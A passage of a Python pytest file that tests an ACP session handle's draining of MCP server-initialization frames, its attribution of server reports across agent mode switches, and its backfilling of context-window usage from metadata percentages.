@pytest.mark.asyncio
async def test_drain_init_consumes_init_frames_and_captures_config():
    """#1: drain_init() pulls MCP-init/config frames off the session queue after
    set_mode so they don't race into the first prompt, and captures
    config_option_update into cached configOptions."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    cfg = [{"id": "effort", "options": ["low", "high"]}]
    q["sA"].put_nowait(
        JsonRpcMessage.from_dict(
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "config_option_update", "configOptions": cfg},
                },
            }
        )
    )
    q["sA"].put_nowait(
        JsonRpcMessage.from_dict(
            {
                "method": "_kiro.dev/mcp/server_initialized",
                "params": {"sessionId": "sA", "serverName": "builder-mcp"},
            }
        )
    )
    await handle.drain_init(duration=0.5, idle_exit=0.05)
    assert q["sA"].empty()  # frames drained, not left for the first prompt
    assert handle._config_options == cfg


@pytest.mark.asyncio
async def test_drain_init_repoisons_on_dead_runtime():
    """#1: a None sentinel (runtime died during init) is re-queued so the next
    consumer still sees the death, and drain stops."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(None)
    await handle.drain_init(duration=0.5, idle_exit=0.05)
    assert q["sA"].get_nowait() is None  # sentinel preserved


def _mcp_initialized_frame(session_id: str, server: str) -> JsonRpcMessage:
    return JsonRpcMessage.from_dict(
        {
            "method": "_kiro.dev/mcp/server_initialized",
            "params": {"sessionId": session_id, "serverName": server},
        }
    )


def _metadata_frame(session_id: str) -> JsonRpcMessage:
    return JsonRpcMessage.from_dict(
        {
            "method": "_kiro.dev/metadata",
            "params": {"sessionId": session_id, "contextUsagePercentage": 1.0},
        }
    )


def _mcp_failure_frame(session_id: str, server: str, error: str) -> JsonRpcMessage:
    return JsonRpcMessage.from_dict(
        {
            "method": "_kiro.dev/mcp/server_init_failure",
            "params": {"sessionId": session_id, "serverName": server, "error": error},
        }
    )


@pytest.mark.asyncio
async def test_drain_init_records_the_session_mcp_report():
    """Registration frames the drain consumes become this session's report.

    Parity with AcpClient._drain_notifications: without this the frames are
    consumed and the session has no way to say which servers started.
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "kirocrew-core"))
    q["sA"].put_nowait(_mcp_failure_frame("sA", "slack-mcp", "spawn ENOENT"))
    q["sA"].put_nowait(_metadata_frame("sA"))

    await handle.drain_init(duration=0.5, idle_exit=0.05)

    payload = handle.mcp_session_report().payload()
    assert payload is not None
    assert payload["ready"] == ["kirocrew-core"]
    assert payload["failed"] == ["slack-mcp"]
    assert payload["failures"] == {"slack-mcp": "spawn ENOENT"}


@pytest.mark.asyncio
async def test_drain_init_skips_a_stale_backlog_report():
    """A pre-switch backlog frame is drained but NOT credited to this report.

    ``stale_report_frames`` names how many already-queued frames are the PRE-switch
    agent's roster. Recording one would show a server the current agent does not
    have as mounted here; leaving it out only understates, which the report
    renders as "no report" rather than "not mounted".
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "previous-agent-server"))

    await handle.drain_init(
        duration=0.2, idle_exit=0.01, no_report_ceiling=0.05, stale_report_frames=1
    )

    assert q["sA"].empty()  # still drained, as the arming docstring promises
    assert handle.mcp_session_report().payload() is None


@pytest.mark.asyncio
async def test_drain_init_refuses_a_sessionless_frame_on_a_lone_runtime():
    """A frame naming no session is not this session's, even when unmarked.

    The runtime sets ``fanout_no_owner`` only once MORE THAN ONE queue is
    registered — right for the idle-stall clock, which may treat a lone session
    as the sole owner of whatever arrives, but not for a view that publishes
    server names as "what THIS session mounted". A co-tenant that emits a
    sessionless frame before registering its own queue would otherwise have its
    server attributed here.
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    frame = _mcp_initialized_frame("sA", "a-co-tenants-server")
    frame.params.pop("sessionId", None)
    assert frame.fanout_no_owner is False, "the lone-queue case leaves it clear"
    q["sA"].put_nowait(frame)

    await handle.drain_init(duration=0.2, idle_exit=0.01, no_report_ceiling=0.05)

    assert handle.mcp_session_report().payload() is None


@pytest.mark.asyncio
async def test_drain_init_credits_the_active_agent_when_the_queue_never_empties():
    """A refilled queue must not extend the stale backlog past its own depth.

    The original defect: exhaustion was detected by the queue going EMPTY, so an
    active agent that refilled it before the backlog drained kept the flag set
    for the rest of the drain and had every one of its reports skipped — a
    session stuck at "no report" for as long as its servers kept talking.
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "previous-agent-server"))

    async def _refill_before_the_backlog_drains() -> None:
        # Lands while the drain is awaiting its first get(), so the queue is
        # already non-empty again when the second iteration begins.
        await asyncio.sleep(0)
        q["sA"].put_nowait(_mcp_initialized_frame("sA", "current-agent-server"))

    feeder = asyncio.create_task(_refill_before_the_backlog_drains())
    try:
        await handle.drain_init(
            duration=0.3, idle_exit=0.05, no_report_ceiling=0.5, stale_report_frames=1
        )
    finally:
        await feeder

    payload = handle.mcp_session_report().payload()
    assert payload is not None, "the active agent's report was swallowed as stale"
    assert payload["ready"] == ["current-agent-server"]


@pytest.mark.asyncio
async def test_drain_init_credits_a_report_that_landed_before_set_mode_answered():
    """A count measured at drain time would swallow the active agent's own report.

    The original defect: the pre-switch depth was read inside ``drain_init``,
    i.e. AFTER set_mode returned. kiro-cli can emit the switched-to agent's
    registrations before it answers, so those frames were already queued by then
    and got counted as pre-switch — consumed without being recorded, leaving a
    false "no report" panel. The caller measures before it sends instead, so a
    frame that arrives during the request is credited.
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "previous-agent-server"))

    # What the caller reads BEFORE sending set_mode: one staged frame.
    staged = handle.queued_frame_count()
    assert staged == 1
    # The switched-to agent registers while set_mode is still in flight.
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "current-agent-server"))

    await handle.drain_init(
        duration=0.2, idle_exit=0.01, no_report_ceiling=0.05, stale_report_frames=staged
    )

    payload = handle.mcp_session_report().payload()
    assert payload is not None, "the active agent's report was swallowed as pre-switch"
    assert payload["ready"] == ["current-agent-server"]


@pytest.mark.asyncio
async def test_drain_init_records_a_post_backlog_report_after_a_switch():
    """After the stale backlog is exhausted, the active agent's own report counts."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "previous-agent-server"))

    async def _after_switch() -> None:
        await asyncio.sleep(0.05)
        q["sA"].put_nowait(_mcp_initialized_frame("sA", "current-agent-server"))

    feeder = asyncio.create_task(_after_switch())
    try:
        await handle.drain_init(
            duration=0.3, idle_exit=0.05, no_report_ceiling=0.5, stale_report_frames=1
        )
    finally:
        await feeder

    payload = handle.mcp_session_report().payload()
    assert payload is not None
    assert payload["ready"] == ["current-agent-server"]


@pytest.mark.asyncio
async def test_create_session_records_the_wire_roster(monkeypatch):
    """The report carries the roster session/new actually sent.

    A different fact from the agent spec on disk, which is what the dashboard's
    other MCP views read.
    """
    rt, _, _ = _make_runtime()

    async def _fake_send(method, params, timeout=None):
        if method == METHOD_SESSION_NEW:
            return {"sessionId": "sid-roster"}
        return {}

    monkeypatch.setattr(rt, "_send_and_await", _fake_send)
    servers = [{"name": "kirocrew-core", "command": "x"}, {"name": "kirocrew-cron"}]

    handle = await rt.create_session(cwd="/w", agent="kirocrew", mcp_servers=servers)

    assert handle.mcp_session_report().configured == ("kirocrew-core", "kirocrew-cron")


@pytest.mark.asyncio
async def test_drain_init_waits_past_idle_window_for_first_mcp_report(monkeypatch):
    """The idle shortcut is not eligible before the first MCP
    registration frame. A server that stays silent past the idle window and
    THEN reports is still observed — non-MCP frames (metadata) that arrive
    immediately after set_mode must not arm the shortcut either."""
    import kiro_crew.acp.session_handle as sh

    monkeypatch.setattr(sh, "_MCP_DRAIN_NO_REPORT_CEILING", 5.0, raising=False)
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # A non-MCP frame is already queued (kiro-cli emits metadata right after
    # set_mode); it must be consumed without arming the idle exit.
    q["sA"].put_nowait(_metadata_frame("sA"))

    async def _late_report() -> None:
        # Many idle windows of silence before the server finally reports.
        await asyncio.sleep(0.15)
        q["sA"].put_nowait(_mcp_initialized_frame("sA", "slow-npx"))

    feeder = asyncio.create_task(_late_report())
    try:
        await handle.drain_init(duration=0.2, idle_exit=0.01)
    finally:
        await feeder
    # The late report was drained rather than left to race into the first turn.
    assert q["sA"].empty()


@pytest.mark.asyncio
async def test_drain_init_no_reports_returns_at_ceiling():
    """A drain that never sees an MCP report returns at the no-report
    ceiling instead of hanging (bounded even when servers are dead or absent)."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_metadata_frame("sA"))  # non-MCP traffic doesn't extend it
    # The outer bound is the hang guard (half the test's timeout): it only
    # names a genuine unbounded wait, never a slow shard.
    await _bounded(
        handle.drain_init(duration=0.05, idle_exit=0.01, no_report_ceiling=0.2),
        what="the init drain returning at its no-report ceiling",
    )
    assert q["sA"].empty()


@pytest.mark.asyncio
async def test_drain_init_idle_exit_stays_prompt_after_first_report():
    """Once a report has been seen, a subsequent idle gap still exits
    promptly — the warm path must not degrade into full-ceiling waits. The
    ceilings sit far past the wait's own lost-run bound, so completing inside
    it proves the idle shortcut (not a ceiling) ended the drain: with the
    shortcut broken the drain holds to its ceiling and the wait fails by name."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "fast-server"))
    far = 10 * default_timeout()
    await _bounded(
        handle.drain_init(duration=far, idle_exit=0.02, no_report_ceiling=far),
        what="the init drain exiting on its idle gap",
    )
    assert q["sA"].empty()


@pytest.mark.asyncio
async def test_drain_init_zero_ceiling_keeps_idle_exit_active_from_start():
    """no_report_ceiling=0.0 (MCP-free runtime opt-out) keeps idle exit
    active before any report, so an empty
    queue exits after one idle window instead of holding for a first report."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(_metadata_frame("sA"))
    # duration sits far past the wait's lost-run bound: completing inside it
    # proves the idle shortcut ended the drain despite zero reports, and a
    # broken shortcut fails the wait by name instead of ending at the deadline.
    await _bounded(
        handle.drain_init(duration=10 * default_timeout(), idle_exit=0.02, no_report_ceiling=0.0),
        what="the init drain exiting on its idle gap",
    )
    assert q["sA"].empty()


@pytest.mark.asyncio
async def test_mcp_free_runtime_skips_no_report_ceiling(monkeypatch):
    """A runtime constructed with expect_mcp_reports=False passes the
    zero ceiling to drain_init, so its sessions never hold for a report."""
    rt = AcpRuntime(work_dir="/tmp", expect_mcp_reports=False)
    rt._initialized = True
    proc = MagicMock()
    proc.returncode = None
    proc.pid = 4242
    rt._process = proc
    rt._pid = 4242

    async def _fake_send(method, params, timeout=None):
        if method == METHOD_SESSION_NEW:
            return {"sessionId": "sid-lite"}
        return {}

    monkeypatch.setattr(rt, "_send_and_await", _fake_send)
    seen: dict = {}
    orig = AcpSessionHandle.drain_init

    async def _spy(self, *args, **kwargs):
        seen.update(kwargs)
        await orig(self, *args, **kwargs)

    with patch.object(AcpSessionHandle, "drain_init", _spy):
        await rt.create_session(cwd="/w", agent="kirocrew-lite", mcp_servers=[])
    assert seen.get("no_report_ceiling") == 0.0


@pytest.mark.asyncio
async def test_drain_init_ignores_pre_switch_reports_still_waits_for_new_agent(monkeypatch):
    """On a shared runtime, session/new initializes the
    PARENT mode's servers; their staged registration frames must not arm the
    idle shortcut for a session that was then mode-SWITCHED — the switched-to
    agent's own slow server, reporting after set_mode, must still be observed."""
    import kiro_crew.acp.session_handle as sh

    monkeypatch.setattr(sh, "_MCP_DRAIN_NO_REPORT_CEILING", 5.0, raising=False)
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # Staged during session/new: the pre-switch agent's roster.
    q["sA"].put_nowait(_mcp_initialized_frame("sA", "parent-mode-server"))
    q["sA"].put_nowait(_metadata_frame("sA"))

    async def _late_report() -> None:
        # The switched-to agent's server reports well past the idle window.
        await asyncio.sleep(0.15)
        q["sA"].put_nowait(_mcp_initialized_frame("sA", "subagent-slow-npx"))

    feeder = asyncio.create_task(_late_report())
    try:
        await handle.drain_init(duration=0.2, idle_exit=0.01, stale_report_frames=1)
    finally:
        await feeder
    # Without the stale-backlog gate, the staged parent report arms the idle
    # exit and the drain returns before the late report — leaving it queued.
    assert q["sA"].empty()


@pytest.mark.asyncio
async def test_reader_retains_mcp_registration_frames_during_init():
    """server_initialized / init_failure emitted before the session/new
    response are staged (like OAuth) and handed to the new session's queue, so
    drain_init() sees warm servers' reports and arms its idle shortcut."""
    rt, reader, _ = _make_runtime()
    task = asyncio.create_task(rt._reader_loop())
    try:

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_NEW:
                # Frames arrive while session/new is in flight — before the
                # queue can be registered under the not-yet-known session id.
                _feed(
                    reader,
                    {
                        "method": "_kiro.dev/mcp/server_initialized",
                        "params": {"sessionId": "sid-warm", "serverName": "core"},
                    },
                )
                _feed(
                    reader,
                    {
                        "method": "_kiro.dev/mcp/server_init_failure",
                        "params": {"sessionId": "sid-warm", "serverName": "broken"},
                    },
                )
                await asyncio.sleep(0.05)  # let the reader route them
                return {"sessionId": "sid-warm"}
            return {}

        with patch.object(rt, "_send_and_await", _fake_send):
            with patch.object(AcpSessionHandle, "drain_init", AsyncMock()) as mock_drain:
                handle = await rt.create_session(cwd="/w", agent="kirocrew", mcp_servers=[])
        assert handle.session_id == "sid-warm"
        mock_drain.assert_awaited_once()
        # Both registration frames were transferred into the session queue
        # (this is what drain_init would consume to arm its idle shortcut).
        methods = []
        while not handle._queue.empty():
            frame = handle._queue.get_nowait()
            assert frame is not None
            methods.append(frame.method)
        assert methods == [
            "_kiro.dev/mcp/server_initialized",
            "_kiro.dev/mcp/server_init_failure",
        ]
        # Staging area was emptied by the transfer.
        assert not rt._pending_init_notifications
    finally:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass


def test_backfill_context_window_from_pct(monkeypatch):
    """#5b: pct-only metadata (kiro 2.10+) backfills window/used tokens from the
    model registry; no-op once a real usage_update set the window."""
    import kiro_crew.acp.session_handle as sh

    # The backfill only fires for a KNOWN window (has_known_window) and resolves
    # via the central model_window authority, so mock both for the fake model.
    monkeypatch.setattr(sh.model_registry, "has_known_window", lambda mid: True)
    monkeypatch.setattr(sh.model_registry, "model_window", lambda mid, **kw: 200000)
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle._model = "some-model"
    handle._track_metadata(
        JsonRpcMessage.from_dict(
            {
                "method": "_kiro.dev/metadata",
                "params": {"contextUsagePercentage": 25},
            }
        )
    )
    assert handle.last_prompt_stats.context_pct == 25.0
    assert handle.last_prompt_stats.context_window_tokens == 200000
    assert handle.last_prompt_stats.context_used_tokens == 50000

    # A prior real usage_update wins — metadata must override neither the
    # window NOR the token-derived pct (else the headline % desyncs from the
    # "used / total" token text shown in the dashboard popover).
    handle2 = AcpSessionHandle("sA", q["sA"], rt)
    handle2._model = "some-model"
    handle2.last_prompt_stats.context_pct = 40.8
    handle2.last_prompt_stats.context_used_tokens = 408000
    handle2.last_prompt_stats.context_window_tokens = 999
    handle2.last_prompt_stats.context_tokens_from_usage = True
    handle2._track_metadata(
        JsonRpcMessage.from_dict(
            {
                "method": "_kiro.dev/metadata",
                "params": {"contextUsagePercentage": 80},
            }
        )
    )
    assert handle2.last_prompt_stats.context_window_tokens == 999
    assert handle2.last_prompt_stats.context_pct == 40.8
    assert handle2.last_prompt_stats.context_used_tokens == 408000


def test_session_handle_usage_update_sets_flag_and_metadata_cannot_clobber():
    """SessionHandle parity with AcpClient: a real usage_update through
    _handle_update sets context_tokens_from_usage, and a later metadata
    contextUsagePercentage must not clobber the token-derived pct (the
    408K/1000K-vs-73% desync on the shared-runtime path)."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle._handle_update(
        JsonRpcMessage.from_dict(
            {
                "method": "session/update",
                "params": {
                    "update": {
                        "sessionUpdate": "usage_update",
                        "used": 408000,
                        "size": 1000000,
                    }
                },
            }
        )
    )
    assert handle.last_prompt_stats.context_tokens_from_usage is True
    assert handle.last_prompt_stats.context_pct == 40.8
    assert handle.last_prompt_stats.context_used_tokens == 408000
    assert handle.last_prompt_stats.context_window_tokens == 1000000

    handle._track_metadata(
        JsonRpcMessage.from_dict(
            {
                "method": "_kiro.dev/metadata",
                "params": {"contextUsagePercentage": 73},
            }
        )
    )
    assert handle.last_prompt_stats.context_pct == 40.8  # NOT clobbered to 73
    assert handle.last_prompt_stats.context_used_tokens == 408000


def test_backfill_context_window_clamps_malformed_pct(monkeypatch):
    """A degenerate metadata percentage (huge finite / inf / NaN) must not
    overflow round() and abort the turn on the shared-runtime path; derived
    used stays in [0, window]."""
    import kiro_crew.acp.session_handle as sh

    monkeypatch.setattr(sh.model_registry, "has_known_window", lambda mid: True)
    monkeypatch.setattr(sh.model_registry, "model_window", lambda mid, **kw: 200000)
    for bad in (1e308, float("inf"), float("nan")):
        rt, _, _ = _make_runtime()
        q = _register(rt, "sA")
        handle = AcpSessionHandle("sA", q["sA"], rt)
        handle._model = "some-model"
        # Must not raise OverflowError/ValueError.
        handle._track_metadata(
            JsonRpcMessage.from_dict(
                {
                    "method": "_kiro.dev/metadata",
                    "params": {"contextUsagePercentage": bad},
                }
            )
        )
        used = handle.last_prompt_stats.context_used_tokens
        assert 0 <= used <= 200000
        # context_pct is sanitized at the source, never left non-finite.
        pct = handle.last_prompt_stats.context_pct
        assert 0.0 <= pct <= 100.0


def test_backfill_context_window_no_model_is_safe(monkeypatch):
    """#5b: no _model set → records pct only, no crash, no token backfill."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle._track_metadata(
        JsonRpcMessage.from_dict(
            {
                "method": "_kiro.dev/metadata",
                "params": {"contextUsagePercentage": 30},
            }
        )
    )
    assert handle.last_prompt_stats.context_pct == 30.0
    assert handle.last_prompt_stats.context_window_tokens == 0
